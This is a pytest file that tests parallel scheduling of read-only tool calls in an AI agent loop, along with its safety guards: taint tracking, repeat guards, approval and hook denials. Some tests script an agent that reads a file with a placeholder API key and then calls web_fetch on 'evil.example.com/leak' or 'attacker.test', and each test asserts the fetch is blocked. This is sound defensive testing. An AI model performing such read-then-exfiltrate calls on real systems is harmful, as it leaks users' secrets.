"""Unit tests for Module 1: same-turn parallel read-only tool scheduling."""

from __future__ import annotations

import asyncio
import time
from pathlib import Path

import pytest

from engine.context.compression import RUNTIME_USER_NOTE_PREFIX
from engine.execution.events import EventType
from engine.execution.hooks.tool.interface import PreToolHook
from engine.execution.hooks.tool.manager import HookRegistry
from engine.execution.orchestration.run_state import (
    RunStateStore,
    RunStatus,
    project_execution_event,
)
from engine.execution.react.react_loop import react_event_loop
from engine.execution.react.tool_batch import (
    is_network_or_egress_tool,
    is_statically_parallel_readable,
)
from engine.llm.contracts import ChatResponse, ToolCallData
from engine.safety.approval import APPROVAL_BROKER, use_approval_context
from engine.safety.rules import SafetyConfig
from engine.safety.taint import SessionTaintStore
from engine.safety.tool_guard import ToolGuard
from engine.tool.interface import ToolCall, ToolDefinition, ToolResult
from engine.tool.ledger import ToolExecutionLedger
from engine.tool.registry import ToolRegistry


class _ScriptedLLM:
    def __init__(self, responses: list[ChatResponse]) -> None:
        self._responses = list(responses)
        self.calls: list[list[dict]] = []

    async def chat(self, messages, tools=None, **kwargs) -> ChatResponse:
        # Deep-ish snapshot of messages list
        self.calls.append([dict(m) for m in messages])
        return self._responses.pop(0)


def _make_read_def(
    name: str,
    *,
    path_args: tuple[str, ...] = ("path",),
    network_access: bool = False,
    egress: bool = False,
    egress_target_arg: str = "",
    reads_private_data: bool = False,
) -> ToolDefinition:
    return ToolDefinition(
        name=name,
        description=f"Test read tool {name}",
        parameters={"type": "object", "properties": {}},
        permission_level="read",
        side_effect="none",
        concurrency="safe",
        is_write_tool=False,
        path_args=path_args,
        network_access=network_access,
        egress=egress,
        egress_target_arg=egress_target_arg,
        reads_private_data=reads_private_data,
    )


def _make_write_def(name: str = "edit_file") -> ToolDefinition:
    return ToolDefinition(
        name=name,
        description="Test write tool",
        parameters={"type": "object", "properties": {}},
        permission_level="write",
        side_effect="write",
        concurrency="serial",
        is_write_tool=True,
        path_args=("path",),
    )


def _register(registry: ToolRegistry, defn: ToolDefinition, func) -> None:
    registry.register(
        defn.name,
        defn.description,
        defn.parameters,
        func,
        network_access=defn.network_access,
        reads_private_data=defn.reads_private_data,
        egress=defn.egress,
        egress_target_arg=defn.egress_target_arg,
        path_args=defn.path_args,
        is_write_tool=defn.is_write_tool,
        permission_level=defn.permission_level,
        side_effect=defn.side_effect,
        concurrency=defn.concurrency,
    )


def test_static_eligibility_and_network_classification():
    read_def = _make_read_def("read_file")
    net_def = _make_read_def("web_fetch", path_args=(), network_access=True, egress=True, egress_target_arg="url")
    private_def = _make_read_def("private_reader", path_args=(), reads_private_data=True)
    write_def = _make_write_def("edit_file")
    mcp_def = _make_read_def("mcp_github_get", path_args=())

    assert is_statically_parallel_readable("read_file", read_def) is True
    assert is_statically_parallel_readable("web_fetch", net_def) is True
    assert is_statically_parallel_readable("private_reader", private_def) is False
    assert is_statically_parallel_readable("edit_file", write_def) is False
    assert is_statically_parallel_readable("get_tool_schema", read_def) is False
    assert is_statically_parallel_readable("render_ui", read_def) is False

    assert is_network_or_egress_tool(read_def) is False
    assert is_network_or_egress_tool(net_def) is True
    assert is_network_or_egress_tool(mcp_def) is True


@pytest.mark.asyncio
async def test_parallel_read_tools_speedup_and_slot_ordering(tmp_path: Path):
    """3 slow read calls run concurrently and commit in original slot_index order."""
    registry = ToolRegistry()
    registry.bind_working_directory(tmp_path)
    guard = ToolGuard(tmp_path / "audit.jsonl")
    guard.file_guard.set_working_directory(tmp_path)
    registry.bind_tool_guard(guard)

    delays = {"slow.txt": 0.14, "mid.txt": 0.08, "fast.txt": 0.02}
    for name in delays:
        (tmp_path / name).write_text(f"content:{name}", encoding="utf-8")

    completion_order: list[str] = []

    async def exec_read(path: str, **_kwargs) -> str:
        p = Path(path)
        await asyncio.sleep(delays[p.name])
        completion_order.append(p.name)
        return p.read_text(encoding="utf-8")

    _register(registry, _make_read_def("read_file"), exec_read)

    registry.bind_tool_guard(guard)

    llm = _ScriptedLLM([
        ChatResponse(
            text="",
            tool_calls=[
                ToolCallData(id="tc-0", name="read_file", arguments={"path": str(tmp_path / "slow.txt")}),
                ToolCallData(id="tc-1", name="read_file", arguments={"path": str(tmp_path / "mid.txt")}),
                ToolCallData(id="tc-2", name="read_file", arguments={"path": str(tmp_path / "fast.txt")}),
            ],
        ),
        ChatResponse(text="done", tool_calls=[]),
    ])

    t0 = time.monotonic()
    events = [
        ev
        async for ev in react_event_loop(
            llm,
            [{"role": "user", "content": "read 3 files"}],
            registry,
            tool_guard=guard,
        )
    ]
    elapsed = time.monotonic() - t0

    # Serial sum is 0.24s; concurrent max is ~0.14s.
    assert elapsed < 0.22, f"Expected parallel execution (<0.22s), took {elapsed:.3f}s"
    # Fast finished before slow (real concurrency + out-of-order completion).
    assert completion_order[0] == "fast.txt"
    assert completion_order[-1] == "slow.txt"

    # Real-time TOOL_CALL_RESULT events streamed in completion order,
    # while conversation tool messages committed in original slot order!
    result_ids = [ev.data["id"] for ev in events if ev.type is EventType.TOOL_CALL_RESULT]
    assert result_ids == ["tc-2", "tc-1", "tc-0"]

    second_call_msgs = llm.calls[1]
    tool_msgs = [m for m in second_call_msgs if m.get("role") == "tool"]
    assert [m["tool_call_id"] for m in tool_msgs] == ["tc-0", "tc-1", "tc-2"]
    assert [m["content"] for m in tool_msgs] == [
        "content:slow.txt",
        "content:mid.txt",
        "content:fast.txt",
    ]


@pytest.mark.asyncio
async def test_mixed_read_write_read_respects_barrier_ordering(tmp_path: Path):
    """[read_1, read_2, edit_1, read_3]: reads 1&2 overlap, edit waits for both, read_3 sees edit."""
    registry = ToolRegistry()
    registry.bind_working_directory(tmp_path)
    guard = ToolGuard(tmp_path / "rules.json")
    guard.file_guard.set_working_directory(tmp_path)
    guard.configure_safety(
        safety_config=SafetyConfig.from_profile_config({
            "safety": {
                "rules": [{"id": "allow-edit", "action": "allow", "tools": ["edit_file"]}],
            }
        })
    )
    registry.bind_tool_guard(guard)

    target = tmp_path / "a.txt"
    target.write_text("v1", encoding="utf-8")
    timeline: list[str] = []

    async def exec_read(path: str, tag: str = "r", **_kwargs) -> str:
        timeline.append(f"start:{tag}")
        await asyncio.sleep(0.05)
        content = Path(path).read_text(encoding="utf-8")
        timeline.append(f"end:{tag}:{content}")
        return content

    async def exec_edit(path: str, **_kwargs) -> str:
        timeline.append("start:edit")
        Path(path).write_text("v2", encoding="utf-8")
        timeline.append("end:edit")
        return "updated"

    _register(registry, _make_read_def("read_file"), exec_read)
    _register(registry, _make_write_def("edit_file"), exec_edit)

    registry.bind_tool_guard(guard)

    llm = _ScriptedLLM([
        ChatResponse(
            text="",
            tool_calls=[
                ToolCallData(id="tc-1", name="read_file", arguments={"path": str(target), "tag": "r1"}),
                ToolCallData(id="tc-2", name="read_file", arguments={"path": str(target), "tag": "r2"}),
                ToolCallData(id="tc-3", name="edit_file", arguments={"path": str(target)}),
                ToolCallData(id="tc-4", name="read_file", arguments={"path": str(target), "tag": "r3"}),
            ],
        ),
        ChatResponse(text="all done", tool_calls=[]),
    ])

    events = [
        ev
        async for ev in react_event_loop(
            llm,
            [{"role": "user", "content": "read, edit, read"}],
            registry,
            tool_guard=guard,
        )
    ]
    assert any(ev.type is EventType.TEXT_DELTA for ev in events)

    # r1 and r2 started before either ended (concurrent)
    assert timeline.index("start:r2") < timeline.index("end:r1:v1")
    # edit started strictly after BOTH r1 and r2 ended
    assert timeline.index("end:r1:v1") < timeline.index("start:edit")
    assert timeline.index("end:r2:v1") < timeline.index("start:edit")
    # r3 started strictly after edit ended and saw v2
    assert timeline.index("end:edit") < timeline.index("start:r3")
    assert "end:r3:v2" in timeline

    tool_msgs = [m for m in llm.calls[1] if m.get("role") == "tool"]
    assert [m["tool_call_id"] for m in tool_msgs] == ["tc-1", "tc-2", "tc-3", "tc-4"]
    assert tool_msgs[3]["content"] == "v2"


@pytest.mark.asyncio
async def test_local_read_to_network_tool_barrier_prevents_taint_bypass(tmp_path: Path):
    """[read_file(secret), web_fetch(evil)] MUST flush local read & taint before web_fetch preflight."""
    registry = ToolRegistry()
    registry.bind_working_directory(tmp_path)
    taint_store = SessionTaintStore()
    safety_cfg = SafetyConfig.from_profile_config({
        "safety": {
            "taint": {
                "enabled": True,
                "on_egress": "deny",
                "egress_allowlist": ["docs.python.org"],
            },
            "rules": [
                {
                    "id": "allow-web-fetch",
                    "action": "allow",
                    "tools": ["web_fetch"],
                    "reason": "allow web_fetch when clean",
                },
            ],
        }
    })
    guard = ToolGuard(tmp_path / "audit.jsonl")
    guard.file_guard.set_working_directory(tmp_path)
    guard.configure_safety(safety_config=safety_cfg, taint_store=taint_store)
    registry.bind_tool_guard(guard)

    secret_file = tmp_path / "notes.txt"
    secret_file.write_text("api_key = sk-proj-ABCDEFGHIJKLMNOPQRSTUVWXYZ123456", encoding="utf-8")
    fetch_called = False

    async def exec_read(path: str, **_kwargs) -> str:
        await asyncio.sleep(0.03)
        return Path(path).read_text(encoding="utf-8")

    async def exec_fetch(url: str = "", **_kwargs) -> str:
        nonlocal fetch_called
        fetch_called = True
        return f"fetched:{url}"

    _register(registry, _make_read_def("read_file"), exec_read)
    _register(registry, 
        _make_read_def(
            "web_fetch",
            path_args=(),
            network_access=True,
            egress=True,
            egress_target_arg="url",
        ),
        exec_fetch,
    )

    registry.bind_tool_guard(guard)

    llm = _ScriptedLLM([
        ChatResponse(
            text="",
            tool_calls=[
                ToolCallData(id="tc-read", name="read_file", arguments={"path": str(secret_file)}),
                ToolCallData(id="tc-fetch", name="web_fetch", arguments={"url": "https://evil.example.com/leak"}),
            ],
        ),
        ChatResponse(text="blocked as expected", tool_calls=[]),
    ])

    events = [
        ev
        async for ev in react_event_loop(
            llm,
            [{"role": "user", "content": "read and fetch"}],
            registry,
            tool_guard=guard,
        )
    ]

    assert taint_store.is_tainted is True
    assert fetch_called is False
    fetch_results = [
        ev.data
        for ev in events
        if ev.type is EventType.TOOL_CALL_RESULT and ev.data.get("id") == "tc-fetch"
    ]
    assert len(fetch_results) == 1
    assert fetch_results[0]["blocked"] is True
    assert "taint-egress-001" in str(fetch_results[0]["reason"])


@pytest.mark.asyncio
async def test_local_read_error_output_taints_before_network_tool(tmp_path: Path):
    """Even when a local read fails (is_error=True) with a secret in error text, taint still blocks web_fetch."""
    registry = ToolRegistry()
    registry.bind_working_directory(tmp_path)
    taint_store = SessionTaintStore()
    safety_cfg = SafetyConfig.from_profile_config({
        "safety": {
            "taint": {
                "enabled": True,
                "on_egress": "deny",
                "egress_allowlist": [],
            },
            "rules": [
                {
                    "id": "allow-web-fetch",
                    "action": "allow",
                    "tools": ["web_fetch"],
                },
            ],
        }
    })
    guard = ToolGuard(tmp_path / "audit.jsonl")
    guard.file_guard.set_working_directory(tmp_path)
    guard.configure_safety(safety_config=safety_cfg, taint_store=taint_store)
    registry.bind_tool_guard(guard)

    f1 = tmp_path / "a.txt"
    f2 = tmp_path / "b.txt"
    f1.write_text("ok", encoding="utf-8")
    f2.write_text("bad", encoding="utf-8")
    fetch_called = False

    async def exec_read(path: str, **_kwargs) -> str:
        if Path(path).name == "b.txt":
            return "Error: leaked key ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"
        return "normal content"

    async def exec_fetch(url: str = "", **_kwargs) -> str:
        nonlocal fetch_called
        fetch_called = True
        return f"fetched:{url}"

    _register(registry, _make_read_def("read_file"), exec_read)
    _register(registry, 
        _make_read_def(
            "web_fetch",
            path_args=(),
            network_access=True,
            egress=True,
            egress_target_arg="url",
        ),
        exec_fetch,
    )

    registry.bind_tool_guard(guard)

    llm = _ScriptedLLM([
        ChatResponse(
            text="",
            tool_calls=[
                ToolCallData(id="tc-1", name="read_file", arguments={"path": str(f1)}),
                ToolCallData(id="tc-2", name="read_file", arguments={"path": str(f2)}),
                ToolCallData(id="tc-3", name="web_fetch", arguments={"url": "https://attacker.test/x"}),
            ],
        ),
        ChatResponse(text="done", tool_calls=[]),
    ])

    events = [
        ev
        async for ev in react_event_loop(
            llm,
            [{"role": "user", "content": "read two files then fetch"}],
            registry,
            tool_guard=guard,
        )
    ]

    assert taint_store.is_tainted is True
    assert fetch_called is False
    fetch_results = [
        ev.data
        for ev in events
        if ev.type is EventType.TOOL_CALL_RESULT and ev.data.get("id") == "tc-3"
    ]
    assert fetch_results and fetch_results[0]["blocked"] is True
    assert "taint-egress-001" in str(fetch_results[0]["reason"])


@pytest.mark.asyncio
async def test_repeat_guard_not_bypassed_by_parallel_network_reads(tmp_path: Path):
    """Parallel network reads must flush before crossing repeat_guard.threshold."""
    registry = ToolRegistry()
    registry.bind_working_directory(tmp_path)
    safety_cfg = SafetyConfig.from_profile_config({
        "safety": {
            "taint": {
                "enabled": True,
                "on_egress": "deny",
                "egress_allowlist": ["*.example.com"],
            },
            "repeat_guard": {
                "enabled": True,
                "threshold": 2,
                "min_risk": "high",
                "on_trigger": "deny",
            },
            "rules": [
                {
                    "id": "allow-web-fetch",
                    "action": "allow",
                    "tools": ["web_fetch"],
                },
            ],
        }
    })
    taint_store = SessionTaintStore()
    taint_store.record("sensitive_file", "read_file", "file:.env")
    guard = ToolGuard(tmp_path / "rules.json")
    guard.file_guard.set_working_directory(tmp_path)
    guard.configure_safety(safety_config=safety_cfg, taint_store=taint_store)
    registry.bind_tool_guard(guard)

    executed_urls: list[str] = []

    async def exec_fetch(url: str, **_kwargs) -> str:
        executed_urls.append(url)
        return f"ok:{url}"

    _register(registry, 
        _make_read_def(
            "web_fetch",
            path_args=(),
            network_access=True,
            egress=True,
            egress_target_arg="url",
        ),
        exec_fetch,
    )

    registry.bind_tool_guard(guard)

    llm = _ScriptedLLM([
        ChatResponse(
            text="",
            tool_calls=[
                ToolCallData(id="tc-1", name="web_fetch", arguments={"url": "https://a.example.com"}),
                ToolCallData(id="tc-2", name="web_fetch", arguments={"url": "https://b.example.com"}),
                ToolCallData(id="tc-3", name="web_fetch", arguments={"url": "https://c.example.com"}),
            ],
        ),
        ChatResponse(text="done", tool_calls=[]),
    ])

    events = [
        ev
        async for ev in react_event_loop(
            llm,
            [{"role": "user", "content": "fetch 3 urls"}],
            registry,
            tool_guard=guard,
        )
    ]

    # Threshold is 2: call #1 executes, call #2 and #3 must be blocked by repeat-sensitive-001!
    assert executed_urls == ["https://a.example.com"]
    tc2 = [ev.data for ev in events if ev.type is EventType.TOOL_CALL_RESULT and ev.data.get("id") == "tc-2"][0]
    assert tc2["blocked"] is True
    assert "repeat-sensitive-001" in str(tc2["reason"])


@pytest.mark.asyncio
async def test_clean_allow_ruled_network_reads_execute_in_parallel(tmp_path: Path):
    """L1: When a clean session explicitly allows web_fetch (effective risk ROUTINE),
    repeat_guard_headroom agrees with check() and multiple web_fetch calls run in parallel."""
    registry = ToolRegistry()
    registry.bind_working_directory(tmp_path)
    safety_cfg = SafetyConfig.from_profile_config({
        "safety": {
            "taint": {"enabled": True},
            "repeat_guard": {
                "enabled": True,
                "threshold": 2,
                "min_risk": "high",
                "on_trigger": "deny",
            },
            "rules": [
                {
                    "id": "allow-web-fetch",
                    "action": "allow",
                    "tools": ["web_fetch"],
                },
            ],
        }
    })
    guard = ToolGuard(tmp_path / "rules.json")
    guard.file_guard.set_working_directory(tmp_path)
    guard.configure_safety(safety_config=safety_cfg, taint_store=SessionTaintStore())

    timeline: list[str] = []

    async def exec_fetch(url: str, **_kwargs) -> str:
        timeline.append(f"start:{url}")
        await asyncio.sleep(0.05)
        timeline.append(f"end:{url}")
        return f"ok:{url}"

    _register(
        registry,
        _make_read_def(
            "web_fetch",
            path_args=(),
            network_access=True,
            egress=True,
            egress_target_arg="url",
        ),
        exec_fetch,
    )
    registry.bind_tool_guard(guard)

    llm = _ScriptedLLM([
        ChatResponse(
            text="",
            tool_calls=[
                ToolCallData(id="tc-1", name="web_fetch", arguments={"url": "https://a.example.com"}),
                ToolCallData(id="tc-2", name="web_fetch", arguments={"url": "https://b.example.com"}),
            ],
        ),
        ChatResponse(text="both fetched", tool_calls=[]),
    ])

    events = [
        ev
        async for ev in react_event_loop(
            llm,
            [{"role": "user", "content": "fetch both"}],
            registry,
            tool_guard=guard,
        )
    ]

    assert any(ev.type is EventType.TEXT_DELTA for ev in events)
    # Both started before either finished -> real parallel execution!
    assert timeline.index("start:https://b.example.com") < timeline.index("end:https://a.example.com")


@pytest.mark.asyncio
async def test_preflight_approval_and_hook_denial_flush_prior_reads(tmp_path: Path):
    """Prior pure reads finish before an outside-workspace approval or PreToolHook denial."""
    workspace = tmp_path / "ws"
    outside = tmp_path / "outside"
    workspace.mkdir()
    outside.mkdir()
    in_file = workspace / "inside.txt"
    out_file = outside / "outside.txt"
    in_file.write_text("inside-data", encoding="utf-8")
    out_file.write_text("outside-data", encoding="utf-8")

    registry = ToolRegistry()
    registry.bind_working_directory(workspace)
    guard = ToolGuard(tmp_path / "rules.json")
    guard.file_guard.set_working_directory(workspace)
    guard.audit = guard.audit.__class__(tmp_path / "audit.jsonl")
    registry.bind_tool_guard(guard)

    executed: list[str] = []

    async def exec_read(path: str, **_kwargs) -> str:
        p = Path(path)
        executed.append(p.name)
        return p.read_text(encoding="utf-8")

    _register(registry, _make_read_def("read_file"), exec_read)

    class _DenyHook(PreToolHook):
        @property
        def id(self) -> str:
            return "deny-hook-target"

        async def check(self, tool_name: str, arguments: dict) -> tuple[bool, str | None]:
            if str(arguments.get("path", "")).endswith("blocked.txt"):
                return False, "Blocked by test hook"
            return True, None

    hook_registry = HookRegistry()
    hook_registry.register_pre_hook(_DenyHook())
    blocked_file = workspace / "blocked.txt"
    blocked_file.write_text("nope", encoding="utf-8")

    registry.bind_tool_guard(guard)

    llm = _ScriptedLLM([
        ChatResponse(
            text="",
            tool_calls=[
                ToolCallData(id="tc-in", name="read_file", arguments={"path": str(in_file)}),
                ToolCallData(id="tc-hook", name="read_file", arguments={"path": str(blocked_file)}),
                ToolCallData(id="tc-out", name="read_file", arguments={"path": str(out_file)}),
            ],
        ),
        ChatResponse(text="finished", tool_calls=[]),
    ])

    run_id = "test-parallel-approval-run"

    with use_approval_context(APPROVAL_BROKER, run_id):
        async for ev in react_event_loop(
            llm,
            [{"role": "user", "content": "read three"}],
            registry,
            tool_guard=guard,
            hook_registry=hook_registry,
        ):
            if ev.type is EventType.TOOL_CALL_RESULT and ev.data.get("approval_required"):
                # inside.txt MUST already have executed before approval opened!
                assert executed == ["inside.txt"]
                APPROVAL_BROKER.resolve(run_id, str(ev.data["approval_id"]), True)

    assert executed == ["inside.txt", "outside.txt"]
    tool_msgs = [m for m in llm.calls[1] if m.get("role") == "tool"]
    assert [m["tool_call_id"] for m in tool_msgs] == ["tc-in", "tc-hook", "tc-out"]
    assert tool_msgs[0]["content"] == "inside-data"
    assert "Blocked by test hook" in tool_msgs[1]["content"]
    assert tool_msgs[1]["content"].startswith("[BLOCKED]")
    assert tool_msgs[2]["content"] == "outside-data"
    # Verify deterministic HashChainLog audit order (3 calls evaluated in exact slot order)
    import json
    audit_lines = [
        json.loads(line)
        for line in (tmp_path / "audit.jsonl").read_text(encoding="utf-8").splitlines()
        if line.strip()
    ]
    assert [e["call_id"] for e in audit_lines] == ["tc-in", "tc-hook", "tc-out"]
    assert guard.audit.verify().ok is True


@pytest.mark.asyncio
async def test_parallel_cancellation_cancels_child_tasks_and_records_completed_taint(tmp_path: Path):
    """M2 + M3: Closing the generator after one read completes deterministically cancels
    remaining slow tasks AND still records taint for the already-completed read."""
    registry = ToolRegistry()
    registry.bind_working_directory(tmp_path)
    taint_store = SessionTaintStore()
    safety_cfg = SafetyConfig.from_profile_config({"safety": {"taint": {"enabled": True}}})
    guard = ToolGuard(tmp_path / "rules.json")
    guard.file_guard.set_working_directory(tmp_path)
    guard.configure_safety(safety_config=safety_cfg, taint_store=taint_store)

    secret_file = tmp_path / "fast_secret.txt"
    slow_file = tmp_path / "slow.txt"
    secret_file.write_text("token = sk-proj-ABCDEFGHIJKLMNOPQRSTUVWXYZ123456", encoding="utf-8")
    slow_file.write_text("slow", encoding="utf-8")

    slow_cancelled = False
    slow_still_running = False

    async def exec_read(path: str, **_kwargs) -> str:
        nonlocal slow_cancelled, slow_still_running
        p = Path(path)
        if p.name == "slow.txt":
            slow_still_running = True
            try:
                await asyncio.sleep(10)
                return "never"
            except asyncio.CancelledError:
                slow_cancelled = True
                raise
            finally:
                slow_still_running = False
        await asyncio.sleep(0.01)
        return p.read_text(encoding="utf-8")

    _register(registry, _make_read_def("read_file"), exec_read)
    registry.bind_tool_guard(guard)

    llm = _ScriptedLLM([
        ChatResponse(
            text="",
            tool_calls=[
                ToolCallData(id="tc-fast", name="read_file", arguments={"path": str(secret_file)}),
                ToolCallData(id="tc-slow", name="read_file", arguments={"path": str(slow_file)}),
            ],
        ),
    ])

    gen = react_event_loop(
        llm,
        [{"role": "user", "content": "fast secret and slow read"}],
        registry,
        tool_guard=guard,
    )
    # Advance until the fast secret read yields its TOOL_CALL_RESULT (both tasks are now running)
    async for ev in gen:
        if ev.type is EventType.TOOL_CALL_RESULT and ev.data.get("id") == "tc-fast":
            break

    await gen.aclose()
    # M3: slow task MUST have been deterministically cancelled before aclose() returned
    assert slow_cancelled is True
    assert slow_still_running is False
    # M2: taint from the already-completed fast read MUST have been recorded
    assert taint_store.is_tainted is True


@pytest.mark.asyncio
async def test_taint_conditional_declarative_rule_flushes_pending_local_reads(tmp_path: Path):
    """M1: [read_file(secret), read_file(x)] with a when.tainted=True deny rule MUST flush
    the first read before evaluating the second so the rule sees updated session taint."""
    registry = ToolRegistry()
    registry.bind_working_directory(tmp_path)
    taint_store = SessionTaintStore()
    safety_cfg = SafetyConfig.from_profile_config({
        "safety": {
            "taint": {"enabled": True},
            "rules": [
                {
                    "id": "deny-read-when-tainted",
                    "action": "deny",
                    "tools": ["read_file"],
                    "when": {"tainted": True},
                    "reason": "no further reads once tainted",
                },
            ],
        }
    })
    guard = ToolGuard(tmp_path / "rules.json")
    guard.file_guard.set_working_directory(tmp_path)
    guard.configure_safety(safety_config=safety_cfg, taint_store=taint_store)

    secret_file = tmp_path / "secret.txt"
    other_file = tmp_path / "other.txt"
    secret_file.write_text("sk-proj-ABCDEFGHIJKLMNOPQRSTUVWXYZ123456", encoding="utf-8")
    other_file.write_text("public", encoding="utf-8")

    executed: list[str] = []

    async def exec_read(path: str, **_kwargs) -> str:
        p = Path(path)
        executed.append(p.name)
        return p.read_text(encoding="utf-8")

    _register(registry, _make_read_def("read_file"), exec_read)
    registry.bind_tool_guard(guard)

    llm = _ScriptedLLM([
        ChatResponse(
            text="",
            tool_calls=[
                ToolCallData(id="tc-1", name="read_file", arguments={"path": str(secret_file)}),
                ToolCallData(id="tc-2", name="read_file", arguments={"path": str(other_file)}),
            ],
        ),
        ChatResponse(text="stopped", tool_calls=[]),
    ])

    events = [
        ev
        async for ev in react_event_loop(
            llm,
            [{"role": "user", "content": "read both"}],
            registry,
            tool_guard=guard,
        )
    ]

    assert taint_store.is_tainted is True
    assert executed == ["secret.txt"]
    tc2 = [ev.data for ev in events if ev.type is EventType.TOOL_CALL_RESULT and ev.data.get("id") == "tc-2"][0]
    assert tc2["blocked"] is True
    assert "deny-read-when-tainted" in str(tc2["reason"])


@pytest.mark.asyncio
async def test_deferred_round_notes_keep_tool_messages_contiguous(tmp_path: Path):
    """get_current_time user note is deferred after ALL role=tool messages in the round."""
    registry = ToolRegistry()
    registry.bind_working_directory(tmp_path)
    guard = ToolGuard(tmp_path / "audit.jsonl")
    guard.file_guard.set_working_directory(tmp_path)
    registry.bind_tool_guard(guard)

    f = tmp_path / "a.txt"
    f.write_text("hello", encoding="utf-8")

    async def exec_time(**_kwargs) -> str:
        return "2026-11-25T16:00:00+08:00"

    async def exec_read(path: str, **_kwargs) -> str:
        return Path(path).read_text(encoding="utf-8")

    _register(registry, _make_read_def("get_current_time", path_args=()), exec_time)
    _register(registry, _make_read_def("read_file"), exec_read)

    registry.bind_tool_guard(guard)

    llm = _ScriptedLLM([
        ChatResponse(
            text="",
            tool_calls=[
                ToolCallData(id="tc-time", name="get_current_time", arguments={}),
                ToolCallData(id="tc-read", name="read_file", arguments={"path": str(f)}),
            ],
        ),
        ChatResponse(text="ok", tool_calls=[]),
    ])

    _ = [
        ev
        async for ev in react_event_loop(
            llm,
            [{"role": "user", "content": "time and file"}],
            registry,
            tool_guard=guard,
        )
    ]

    msgs = llm.calls[1]
    assistant_idx = next(i for i, m in enumerate(msgs) if m.get("role") == "assistant")
    # Immediately after assistant tool_calls must be BOTH role="tool" messages contiguously!
    assert msgs[assistant_idx + 1]["role"] == "tool"
    assert msgs[assistant_idx + 1]["tool_call_id"] == "tc-time"
    assert msgs[assistant_idx + 2]["role"] == "tool"
    assert msgs[assistant_idx + 2]["tool_call_id"] == "tc-read"
    # Followed by the deferred RUNTIME_USER_NOTE_PREFIX user message
    assert msgs[assistant_idx + 3]["role"] == "user"
    assert msgs[assistant_idx + 3]["content"].startswith(RUNTIME_USER_NOTE_PREFIX)


@pytest.mark.asyncio
async def test_parallel_read_batch_never_touches_ledger(tmp_path: Path):
    """Parallel read-only tools never write ToolExecutionLedger entries; serial writes do."""
    registry = ToolRegistry()
    registry.bind_working_directory(tmp_path)
    ledger = ToolExecutionLedger(tmp_path, "run-ledger-test")
    registry.bind_execution_ledger(ledger)
    guard = ToolGuard(tmp_path / "rules.json")
    guard.file_guard.set_working_directory(tmp_path)
    guard.configure_safety(
        safety_config=SafetyConfig.from_profile_config({
            "safety": {
                "rules": [{"id": "allow-edit", "action": "allow", "tools": ["edit_file"]}],
            }
        })
    )
    registry.bind_tool_guard(guard)

    f = tmp_path / "x.txt"
    f.write_text("v1", encoding="utf-8")

    async def exec_read(path: str, **_kwargs) -> str:
        return Path(path).read_text(encoding="utf-8")

    async def exec_edit(path: str, **_kwargs) -> str:
        Path(path).write_text("v2", encoding="utf-8")
        return "ok"

    _register(registry, _make_read_def("read_file"), exec_read)
    _register(registry, _make_write_def("edit_file"), exec_edit)

    registry.bind_tool_guard(guard)

    llm = _ScriptedLLM([
        ChatResponse(
            text="",
            tool_calls=[
                ToolCallData(id="tc-r1", name="read_file", arguments={"path": str(f)}),
                ToolCallData(id="tc-r2", name="read_file", arguments={"path": str(f)}),
                ToolCallData(id="tc-w1", name="edit_file", arguments={"path": str(f)}),
            ],
        ),
        ChatResponse(text="done", tool_calls=[]),
    ])

    _ = [
        ev
        async for ev in react_event_loop(
            llm,
            [{"role": "user", "content": "read twice then edit"}],
            registry,
            tool_guard=guard,
        )
    ]

    with ledger._connect() as conn:
        rows = conn.execute("SELECT tool_name FROM tool_executions").fetchall()
    assert [r[0] for r in rows] == ["edit_file"]


def test_run_state_active_tools_tracks_concurrent_calls(tmp_path: Path):
    """RunState.active_tools tracks multiple running call_ids and preserves current_tool."""
    store = RunStateStore(tmp_path)
    store.create("run-par", agent_id="smith")
    from engine.execution.events import ExecutionEvent

    project_execution_event(store, "run-par", ExecutionEvent(EventType.RUN_STARTED, {"run_id": "run-par"}))
    project_execution_event(
        store,
        "run-par",
        ExecutionEvent(EventType.TOOL_CALL_START, {"id": "c1", "name": "read_file"}),
    )
    project_execution_event(
        store,
        "run-par",
        ExecutionEvent(EventType.TOOL_CALL_START, {"id": "c2", "name": "grep"}),
    )
    state = store.get("run-par")
    assert state is not None
    assert state.current_tool == "read_file"
    assert state.active_tools == [
        {"id": "c1", "name": "read_file"},
        {"id": "c2", "name": "grep"},
    ]

    # Finish c1 first -> c2 still active!
    project_execution_event(
        store,
        "run-par",
        ExecutionEvent(EventType.TOOL_CALL_RESULT, {"id": "c1", "name": "read_file"}),
    )
    state = store.get("run-par")
    assert state is not None
    assert state.current_tool == "grep"
    assert state.active_tools == [{"id": "c2", "name": "grep"}]

    # Finish c2 -> both cleared
    project_execution_event(
        store,
        "run-par",
        ExecutionEvent(EventType.TOOL_CALL_RESULT, {"id": "c2", "name": "grep"}),
    )
    state = store.get("run-par")
    assert state is not None
    assert state.current_tool is None
    assert state.active_tools == []
